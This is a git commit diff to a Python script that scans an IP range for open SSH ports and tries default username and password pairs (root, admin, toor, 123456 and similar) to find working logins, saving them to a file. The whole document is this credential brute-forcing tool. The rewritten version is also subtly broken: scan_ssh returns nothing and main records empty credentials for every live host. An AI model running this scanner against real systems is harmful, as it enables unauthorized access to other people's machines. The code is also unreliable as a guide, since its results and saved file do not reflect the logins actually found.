8c8fd97291d5787ca466f466856061fafb282329
BongHitz <itz.bonghitz@gmail.com>
2023-05-20 13:59:59 -0400

    Update main.py
    Big fixes

--- main.py
+++ main.py
@@ -1,4 +1,3 @@
-import asyncio 
 import socket 
 import time 
 import paramiko 
@@ -9,41 +8,35 @@ from rich.table import Table
 from rich.logging import RichHandler  
 
 console = Console()
-console.print("Let's scan for SSH credentials...", style="bold blue")  
 
-logging.basicConfig(     
-    level="NOTSET", 
-    format="%(message)s", 
-    handlers=[RichHandler(console=console, markup=True)] 
-)  
-
-log = logging.getLogger("scancodes")  
-
-async def check_port(ip_address, port):
+def check_port(ip_address, port, timeout=0.5):
     """
     Checks whether or not a port is open for a specified IP address
     """
     try:
-        await asyncio.wait_for(asyncio.open_connection(ip_address.ip, port), timeout=0.5)
-        return ip_address
+        socket.setdefaulttimeout(timeout)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip_address, port))
+        s.close()
+        return True
     except:
-        return None  
+        return False  
 
-async def scan_ips(ip_range, port):
+def scan_ips(ip_range, port):
     """
     Scans a range of IP addresses for an open port
     """
-    loop = asyncio.get_event_loop() 
-    tasks = [loop.create_task(check_port(i, port)) for i in ip_range]  
-    results = await asyncio.gather(*tasks, return_exceptions=True) 
-    live_ips = [ip for ip in results if ip is not None] 
-
-    console.print(f"Scanned {len(ip_range)} IP addresses and found {len(live_ips)} live IPs", style="cyan") 
-    log.info(f"Live IPs found: {live_ips}") 
+    live_ips = []
+    for ip in ip_range:
+        if check_port(str(ip), port):
+            live_ips.append(str(ip))
+            console.print(f"IP {ip} is live", style="green")
+        else:
+            console.print(f"IP {ip} is not live", style="red")
 
     return live_ips  
 
-async def try_ssh(ip_address, username, password):
+def try_ssh(ip_address, username, password, timeout=0.5, banner_timeout=5):
     """
     Attempts an SSH connection with a specified username and password for a given IP address
     """
@@ -51,26 +44,24 @@ async def try_ssh(ip_address, username, password):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     try:
-        ssh.connect(ip_address, username=username, password=password, timeout=0.5, banner_timeout=5)
-        return username, password
+        ssh.connect(ip_address, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout)
+        return True
     except:
-        return None, None  
+        return False  
 
-async def scan_ssh(ip_address):
+def scan_ssh(ip_address):
     """
     Scans an IP address with a range of default usernames and passwords
     to return successful SSH login credentials
     """
-    loop = asyncio.get_event_loop() 
     usernames = ['root', 'admin', 'ubuntu','kali']
     passwords = ['password', '123456', 'admin', 'toor', 'qwerty'] 
-    tasks = [loop.create_task(try_ssh(ip_address, user, password)) for user in usernames for password in passwords]  
-    results = await asyncio.gather(*tasks, return_exceptions=True) 
-    credentials = [(user, password) for user, password in results if user is not None] 
-
-    console.print(f"Scanned {ip_address} with {len(usernames) * len(passwords)} pairs and found {len(credentials)} successful logins", style="cyan") 
-    log.info(f"Credentials found for {ip_address}: {credentials}") 
-    return credentials  
+    for user in usernames:
+        for password in passwords:
+            if try_ssh(ip_address, user, password):
+                console.print(f"Successfully logged in to {ip_address} with username: {user} and password: {password}", style="green")
+            else:
+                console.print(f"Failed to log in to {ip_address} with username: {user} and password: {password}", style="red")
 
 def print_results_table(credentials):
     """
@@ -83,7 +74,7 @@ def print_results_table(credentials):
 
     for ip, credential in credentials.items():
         table.add_row(f"[bold]{ip}[/bold]", credential[0], credential[1])
-        log.info(f"{ip}: Username={credential[0]}, Password={credential[1]}")
+        console.print(f"Successful login to {ip} with username: {credential[0]} and password: {credential[1]}", style="green")
 
     console.print(table)
 
@@ -93,9 +84,9 @@ def write_to_file(credentials):
     """
     with open("successful_logins.txt", "a") as f:
         for ip, credential in credentials.items():
-            f.write(f"{ip}\t{credential[0]}\t{credential[1]}\n") 
+            f.write(f"{ip}\t{credential[0]}\t{credential[1]}\n")
 
-async def main():
+def main():
     """
     Main function to be run
     """
@@ -106,10 +97,10 @@ async def main():
             ip_list = list(parsed_ip_range.hosts())
             break
         except ipaddress.AddressValueError:
-            print("Invalid IP range format. Please try again.")
+            console.print("Invalid IP range format. Please try again.", style="bold red")
 
     port = 22
-    live_ips = await scan_ips(ip_list, port)
+    live_ips = scan_ips(ip_list, port)
 
     if len(live_ips) == 0:
         console.print("No live IPs found in range. Exiting.", style="bold red")
@@ -117,10 +108,11 @@ async def main():
 
     credentials = {}
     for ip in live_ips:
-        credentials[ip] = await scan_ssh(ip)
+        scan_ssh(ip)
+        credentials[ip] = ('', '')
 
     print_results_table(credentials)
     write_to_file(credentials) 
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    main()
